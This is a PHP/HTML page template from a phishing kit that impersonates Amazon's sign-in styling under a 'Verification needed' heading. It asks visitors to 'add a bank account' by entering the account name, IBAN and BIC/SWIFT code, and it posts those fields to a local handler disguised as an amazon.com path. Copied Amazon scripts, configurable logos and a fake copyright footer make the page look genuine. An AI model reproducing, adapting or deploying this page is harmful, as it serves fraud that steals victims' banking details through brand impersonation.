<!doctype html>
  <head>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta charset="utf-8">
    <title dir="ltr"><?=$core->translate('en',$lang,'Amazon Link an email');?></title> <meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="icon" type="image/x-icon" href="../aws/img/favicon.ico" /> 
<script type="text/javascript" src="../aws/js/jquery.min.js"></script>  
 <script type="text/javascript" src="../aws/js/jquery.maskedinput.min.js"></script>
    <script type="text/javascript" src="../aws/js/jquery.payment.min.js"></script>
    <script type="text/javascript" src="../aws/js/custom.js"></script>
       <style type="text/css">
.auth-workflow .auth-pagelet-container{max-width:580px;margin:0 auto}.auth-workflow .auth-pagelet-container-wide{width:500px;margin:0 auto}#auth-alert-window{display:none}.auth-pagelet-mobile-container{max-width:400px;margin:0 auto}.auth-pagelet-desktop-narrow-container{max-width:350px;margin:0 auto}.auth-pagelet-desktop-wide-container{max-width:600px;margin:0 auto}label.auth-hidden-label{height:0!important;width:0!important;overflow:hidden;position:absolute}.auth-phone-number-input{margin-left:10px}#auth-captcha-noop-link{display:none}#auth-captcha-image-container{height:70px;width:200px;margin-right:auto;margin-left:auto}.auth-logo-cn{width:110px!important;height:60px!important;background-position:-105px -365px!important;-webkit-background-size:600px 1000px!important;background-size:600px 1000px!important;background-image:url("../aws/aui_sprite_0029-2x._V1_.png")!important}.auth-footer-seperator{display:inline-block;width:20px}#auth-cookie-warning-message{display:none}#auth-pv-client-side-error-box,#auth-pv-client-side-success-box{display:none}.auth-error-messages{color:black;margin:0}.auth-error-messages li{list-style:none;display:none}.ap_ango_default .ap_ango_email_elem,.ap_ango_default .ap_ango_phone_elem{display:none}.ap_ango_phone .ap_ango_email_elem,.ap_ango_phone .ap_ango_default_elem{display:none}.ap_ango_email .ap_ango_phone_elem,.ap_ango_email .ap_ango_default_elem{display:none}.auth-interactive-dialog{width:100%;height:100%;position:fixed;top:0;left:0;display:none;background:rgba(0,0,0,0.8);z-index:100}.auth-interactive-dialog #auth-interactive-dialog-container{display:table-cell;height:100%;vertical-align:middle;position:relative;text-align:center}.auth-interactive-dialog #auth-interactive-dialog-container .auth-interactive-dialog-content{display:inline-block}.auth-third-party-content{text-align:center}.auth-wechat-login-button .wechat_button{background:#13d71f;background:-webkit-gradient(linear,left top,left bottom,from(#13d71f),to(#64d720));background:-webkit-linear-gradient(top,#13d71f,#63d71f);background:-moz-linear-gradient(top,#13d71f,#63d71f);background:-ms-linear-gradient(top,#13d71f,#63d71f);background:-o-linear-gradient(top,#13d71f,#63d71f);background:linear-gradient(top,#13d71f,#63d71f)}.wechat_button_label{color:#fff}.wechat_button_icon{top:5px!important}.a-lt-ie8 .wechat_button_icon{top:0!important}.a-lt-ie8 .auth-wechat-login-button .a-button-inner{height:31px}#auth-enter-pwd-to-cont{margin-left:2px}.ap_hidden{display:none}
</style>
<link rel="stylesheet" type="text/css" href="../aws/css/details.css">
<script>
(function() {
    (function() {
        var f = window.AmazonUIPageJS;
        if (f && f.when && f.register) throw Error("A copy of P has already been loaded on this page.");
        f = window.AmazonUIPageJS = {};
        f.error = function(f, m, j, k) {
            f = f + " @ " + (m || "N/A") + ":" + (j || "N/A");
            k && k.substring(0, 2) === "a-" && (f = "[aui] " + f);
            throw Error(f);
        }
    })();
    (function() {
        function f(a) {
            for (var c = [], b = a && a.length, d = 0; b && d < b; d++) c.push(s[a[d]] || g[a[d]] || null);
            return c
        }

        function n(a) {
            var c = f(a.dependencies);
            if (a.fn && typeof a.fn === "function") try {
                s[a.name] = a.fn.apply(window,
                    c), g[a.name] = !0, o.notify(a)
            } catch (b) {
                i.error("[" + a.name + "] had an error: " + (b && b.message || b), "P", "initComponent", a.name)
            } else g[a.name] = !0, o.notify(a)
        }

        function m(a) {
            t.schedule(function() {
                n(a)
            })
        }

        function j(a, c, b, d) {
            typeof g[c] !== "undefined" && i.error("A component named " + c + " has already been registered.", "P", "register", c);
            g[c] = !1;
            var c = {
                    name: c,
                    dependencies: a,
                    fn: b
                },
                b = d ? n : m,
                a = f(a),
                h = !0,
                p;
            for (p = 0; p < a.length; p++) h = h && a[p];
            h || d ? b(c) : o.wait(c)
        }

        function k(a, c) {
            if (q[a]) return !0;
            q[a] = !0;
            if (c instanceof Array) {
                for (var b =
                        0; b < c.length; b++) v[c[b]] && i.error("An asset that contains " + c[b] + " has already been loaded.", "P", "alreadyLoaded");
                for (b = 0; b < c.length; b++) v[c[b]] = !0
            }
            return !1
        }

        function u(a, c) {
            return function(b, d) {
                typeof b === "function" && (d = b, b = "anon" + l++);
                j(a, b, d, c)
            }
        }
        var i = window.AmazonUIPageJS;
        i.AUI_BUILD_DATE = "3.14.6.0-patch_gesture-2015-05-17";
        var e = window.ue;
        e && e.tag && (e.tag("aui"), e.tag("aui:aui_build_date:" + i.AUI_BUILD_DATE));
        var q = {},
            v = {},
            s = {},
            g = {},
            l = 0,
            r, t = function() {
                function a() {
                    return setTimeout(c, 0)
                }

                function c() {
                    for (var e =
                            a(), f = Date.now();;) {
                        if (h.length === 0) {
                            clearTimeout(e);
                            p = !1;
                            break
                        }
                        h.shift().call();
                        if (Date.now() - f >= b) {
                            clearTimeout(e);
                            setTimeout(c, d);
                            break
                        }
                    }
                }
                if (!Date.now) Date.now = function() {
                    return (new Date).getTime()
                };
                var b = 50,
                    d = 50,
                    h = [],
                    p = !1;
                try {
                    /OS 6_[0-9]+ like Mac OS X/i.test(navigator.userAgent) && typeof window.addEventListener === "function" && window.addEventListener("scroll", a, !1)
                } catch (e) {}
                return {
                    schedule: function(b) {
                        h.push(b);
                        p || (a(), p = !0)
                    }
                }
            }(),
            o = function() {
                var a = {},
                    c = {};
                return {
                    wait: function(b) {
                        for (var d = 0; d <
                            b.dependencies.length; d++) {
                            var h = b.dependencies[d];
                            g[h] || (a[h] = a[h] || [], c[b.name] = c[b.name] || 0, a[h].push(b), c[b.name]++)
                        }
                    },
                    notify: function(b) {
                        var d = a[b.name],
                            h;
                        if (d) {
                            for (var e = 0; e < d.length; e++) h = d[e], c[h.name]--, c[h.name] === 0 && m(h);
                            delete a[b.name]
                        }
                    }
                }
            }();
        i.when = function() {
            var a = arguments;
            return {
                register: function(c, b) {
                    j(a, c, b)
                },
                execute: u(a)
            }
        };
        i.now = function() {
            return {
                execute: u(arguments, !0)
            }
        };
        i.execute = u(null);
        i.register = function(a, c) {
            j(null, a, c)
        };
        i.trigger = function(a, c) {
            var b = Date.now(),
                e = {
                    data: c,
                    pageElapsedTime: window.aPageStart ? b - window.aPageStart : NaN,
                    triggerTime: b
                };
            j(null, a, function() {
                return e
            });
            typeof r === "function" && r(a, e)
        };
        i.handleTriggers = function(a) {
            typeof r === "function" && i.error("Trigger handler already registered", "P", "handleTriggers");
            r = a
        };
        i.load = {
            js: function(a, c) {
                if (k(a, c)) return !1;
                e && e.count && e.count("aui:resource_count", (e.count("aui:resource_count") || 0) + 1);
                var b = document.createElement("script");
                b.type = "text/javascript";
                b.src = a;
                b.async = !0;
                document.getElementsByTagName("head")[0].appendChild(b);
                return !0
            },
            css: function(a, c) {
                if (k(a, c)) return !1;
                e && e.count && e.count("aui:resource_count", (e.count("aui:resource_count") || 0) + 1);
                var b = document.createElement("link");
                b.type = "text/css";
                b.rel = "stylesheet";
                b.href = a;
                document.getElementsByTagName("head")[0].appendChild(b)
            }
        }
    })();
    (function() {
        window.AmazonUIPageJS.log = function(f, n, m) {
            var j = window.ueLogError;
            j && j({
                message: f,
                logLevel: n || "ERROR",
                attribution: m
            })
        }
    })();
    window.P = window.AmazonUIPageJS;
    window.AmazonUIPageJS.register("p-weblab", function() {
        return {}
    });
    window.AmazonUIPageJS.when("p-weblab").register("p-detect", function(f) {
        function n(a, b) {
            for (var c = a.className.split(" "), e = c.length; e--;)
                if (c[e] === b) return;
            a.className += " " + b
        }

        function m(a, b) {
            for (var c = a.className.split(" "), e = [], d;
                (d = c.pop()) !== i;) d && d !== b && e.push(d);
            a.className = e.join(" ")
        }

        function j(a) {
            try {
                return a()
            } catch (b) {
                return !1
            }
        }

        function k() {
            if (o) {
                var d = window.innerWidth ? {
                        w: window.innerWidth,
                        h: window.innerHeight
                    } : {
                        w: e.clientWidth,
                        h: e.clientHeight
                    },
                    f = !1;
                Math.abs(d.w - c.w) > 5 || d.h - c.h > 50 ? (c = d,
                    b = 4, (f = g.mobile || g.tablet ? d.w > d.h : d.w >= 1250) ? n(e, "a-ws") : m(e, "a-ws")) : b-- && (a = setTimeout(k, 16))
            }
        }

        function u() {
            clearTimeout(a);
            b = 4;
            k()
        }
        var i, e = document.documentElement,
            q;
        try {
            q = navigator.userAgent
        } catch (v) {
            q = ""
        }
        var s = function() {
                var a = "Khtml,O,ms,Moz,Webkit".split(","),
                    b = document.createElement("div");
                return {
                    testGradients: function() {
                        b.style.cssText = ("background-image:" + "-webkit- ".split(" ").join("gradient(linear,left top,right bottom,from(#9f9),to(white));background-image:") + a.join("linear-gradient(left top,#9f9, white);background-image:")).slice(0, -17);
                        return b.style.backgroundImage.indexOf("gradient") > -1
                    },
                    test: function(c) {
                        for (var d = c.charAt(0).toUpperCase() + c.substr(1), c = (a.join(d + " ") + d + " " + c).split(" "), d = c.length; d--;)
                            if (b.style[c[d]] === "") return !0;
                        return !1
                    },
                    testTransform3d: function() {
                        var a = !1;
                        if (window.matchMedia) a = window.matchMedia("(-webkit-transform-3d)").matches;
                        return a
                    }
                }
            }(),
            g = {
                audio: function() {
                    return !!document.createElement("audio").canPlayType
                },
                video: function() {
                    return !!document.createElement("video").canPlayType
                },
                canvas: function() {
                    return !!document.createElement("canvas").getContext
                },
                offline: function() {
                    return navigator.hasOwnProperty && navigator.hasOwnProperty("onLine") && navigator.onLine
                },
                dragDrop: function() {
                    return "draggable" in document.createElement("span")
                },
                geolocation: function() {
                    return !!navigator.geolocation
                },
                history: function() {
                    return !(!window.history || !window.history.pushState)
                },
                autofocus: function() {
                    return "autofocus" in document.createElement("input")
                },
                inputPlaceholder: function() {
                    return "placeholder" in document.createElement("input")
                },
                textareaPlaceholder: function() {
                    return "placeholder" in
                        document.createElement("textarea")
                },
                localStorage: function() {
                    return "localStorage" in window && window.localStorage !== null
                },
                orientation: function() {
                    return "orientation" in window
                },
                touch: function() {
                    return "ontouchend" in document
                },
                gradients: function() {
                    return s.testGradients()
                },
                hires: function() {
                    return window.devicePixelRatio && window.devicePixelRatio >= 1.5
                },
                transform3d: function() {
                    return s.testTransform3d()
                },
                touchScrolling: function() {
                    return RegExp("Windowshop|android.[3-9]|OS [5-8](_[0-9])+ like Mac OS X|Chrome|Silk|Firefox|Trident" +
                        String.fromCharCode(92) + "/.+?; Touch", "i").test(q)
                },
                ios: function() {
                    return !!q.match(/OS [1-9](_[0-9])+ like Mac OS X/i)
                },
                android: function() {
                    return !!q.match(/android [1-9]/i)
                },
                mobile: function() {
                    return /(^| )a-mobile( |$)/.test(e.className)
                },
                tablet: function() {
                    return /(^| )a-tablet( |$)/.test(e.className)
                }
            },
            l;
        for (l in g) g.hasOwnProperty(l) && (g[l] = j(g[l]));
        for (var r = "textShadow textStroke boxShadow borderRadius borderImage opacity transform transition".split(" "), t = 0; t < r.length; t++) g[r[t]] = j(function() {
            return s.test(r[t])
        });
        var o = !0,
            a = 0,
            c = {
                w: 0,
                h: 0
            },
            b = 4;
        k();
        typeof window.addEventListener === "function" ? window.addEventListener("resize", u, !1) : window.attachEvent("onresize", u);
        m(e, "a-no-js");
        n(e, "a-js");
        l = [];
        for (var d in g) g.hasOwnProperty(d) && g[d] && l.push("a-" + d.replace(/([A-Z])/g, function(a) {
            return "-" + a.toLowerCase()
        }));
        for (d in f) f.hasOwnProperty(d) && l.push("a-" + (d + "-" + f[d]).toLowerCase());
        n(e, l.join(" "));
        e.setAttribute("data-aui-build-date", window.AmazonUIPageJS.AUI_BUILD_DATE);
        return {
            capabilities: g,
            toggleResponsiveGrid: function(a) {
                (o =
                    a === i ? !o : !!a) && k()
            },
            responsiveGridEnabled: function() {
                return o
            }
        }
    })
})();
(window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('js/1.js');
(window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('js/2.js');
</script>
</head>
  <body>
<div id="a-page">
    <div class="a-section a-padding-medium auth-workflow">
      <div class="a-section a-spacing-none">
<div class="a-section a-spacing-medium a-text-center">
           <center><img src="../aws/img/<?=$config['amz_logo'];?>" onContextMenu="return false;"></center>
      <center><img src="../aws/img/<?=$config['step2_logo'];?>" onContextMenu="return false;"></center>
</div>
      </div>
      <div class="a-section">
<div class="a-section a-spacing-base auth-pagelet-container">
  <div class="a-section"> 
<form method="post" action="../www.amazon.com/gp/bank?locale=<?=$localex;?>" class="auth-validate-form a-spacing-none">
   <div class="a-section">
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
          <h1 class="a-spacing-small">
            <?=$core->translate('en',$lang,'Verification needed');?>
          </h1>

  <?=$core->translate('en',$lang,'Add bank account');?>
  <br/><br/>

          <div class="a-row a-spacing-base">
            <label for="ml">
Name on account : 
            </label>
            <input type="text" id="namebank" required="required" maxlength="128"  name="namebank" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field" >
          </div>
          <div class="a-row a-spacing-base">
            <label for="ml">
IBAN :
            </label>
            <input type="text" required="required" maxlength="128"  name="iban" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
          </div>
        <div class="a-row a-spacing-base">
            <label for="ml">
BIC (Swift-Code) :
            </label>
            <input type="text" required="required" maxlength="128"  name="swift_code" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
          </div>
<hr>
          <div class="a-section a-spacing-extra-large">
            <span class="a-button a-button-span12 a-button-primary" role="button"><span class="a-button-inner"><input id="signInSubmit" tabindex="5" class="a-button-input" type="submit"><span class="a-button-text" aria-hidden="true">
              <?=$core->translate('en',$lang,'Next Step');?>
            </span></span></span>
          </div>
             
          
        </div></div>
      </div>
      
    </form>
  </div>
</div>
      </div>
      <div id="right-2">
      </div>
      <center>
                <p><a href="#"><?=$core->translate('en',$lang,'Help');?></a> | <a href="#"><?=$core->translate('en',$lang,'Condition of Use');?></a> | <a href="#"><?=$core->translate('en',$lang,'Privacy Notice');?></a></p><br>
                <p>&copy; 1996 - <?php echo date('Y'); ?> <?=$config['domain'];?>, Inc. or its affiliates</p>
            </center>
    </div>
  </div>
</body>
</html>
